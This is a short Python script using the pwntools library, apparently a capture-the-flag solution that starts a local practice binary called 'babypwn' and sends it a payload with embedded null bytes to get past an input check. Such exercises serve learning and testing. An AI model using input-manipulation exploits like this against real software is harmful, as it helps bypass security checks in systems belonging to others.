from pwn import *

p = process('./babypwn')

payload = '11111111\x0011111111\x00'

p.recvline()
p.sendline(payload)
print('\n'+p.recvline().decode())